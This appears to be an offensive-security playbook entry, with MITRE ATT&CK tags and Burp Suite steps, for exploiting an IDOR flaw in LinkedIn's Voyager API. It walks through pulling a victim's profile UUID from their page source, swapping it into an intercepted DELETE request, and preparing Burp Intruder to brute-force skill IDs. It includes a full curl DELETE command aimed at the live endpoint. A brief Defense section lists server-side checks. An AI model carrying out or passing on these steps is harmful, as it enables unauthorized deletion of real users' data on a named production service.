---
id: proc-linkedin-modify-victim
tags:
  - modify
  - uuid
  - idor
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/linkedin-delete-skill-assessment]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:34.030Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Modify-Request-with-Victim-Profile

## Summary

This procedure modifies the intercepted LinkedIn delete request by replacing the attacker's profile UUID with the victim's, enabling unauthorized targeting of another user's skill assessment.

## Description

The IDOR flaw allows swapping the 'fsd_profile' URN without validation. The victim's UUID is extracted from their public profile page source (e.g., via browser dev tools searching for 'profileUrn'). The modified request is then sent to Burp Intruder for skill ID handling. This targets the LinkedIn Voyager API; success leads to potential deletion upon correct skill ID match.

## Requirements

1. Intercepted base request from prior procedure
2. Victim's public LinkedIn profile URL
3. Burp Suite Repeater or Intruder configured

## Defense

Defensive measures and detection strategies:

- Server-side authorization checks on profile IDs against session user
- Audit logs for cross-profile deletion attempts
- Rate limit API calls per profile

## Objectives

1. Insert victim's UUID into request path
2. Maintain request integrity for forwarding
3. Set up for brute-force on skill parameter

## Instructions

### Step 1: Extract Victim UUID

**Context**: Obtain the target's profile identifier from public data.

Open victim's profile in browser, view page source (Ctrl+U), search for 'urn:li:fsd_profile:' or 'profileUrn'.

> UUID appears as a string like 'ac0a1234-5678-90ab-cdef-1234567890ab'; copy it.

### Step 2: Edit Request in Burp

**Context**: Replace the profile parameter in the intercepted request.

In Burp Repeater, update the path: urn%3Ali%3Afsd_profile%3A{victim-uuid} (URL-encode as needed).

> Use [[commands/linkedin-delete-skill-assessment]] as reference for full syntax:

```bash
curl -X DELETE "https://www.linkedin.com/voyager/api/voyagerAssessmentsDashSkillAssessmentAttemptReports/urn%3Ali%3Afsd_skillAssessmentAttemptReport%3A(urn%3Ali%3Afsd_profile%3A{victim-uuid}%2Curn%3Ali%3Askill%3A{skill-id}%2C{sequence})" -H "Authorization: Bearer {token}" -H "Csrf-Token: {csrf}"
```

> Request updates without errors; send to Intruder.

### Step 3: Forward to Intruder

**Context**: Prepare for skill ID variation.

Right-click request in Repeater and select 'Send to Intruder'; mark skill ID position with §.

> Intruder loads with payload positions set.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/linkedin-delete-skill-assessment]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[modify]]
- [[uuid]]
- [[idor]]
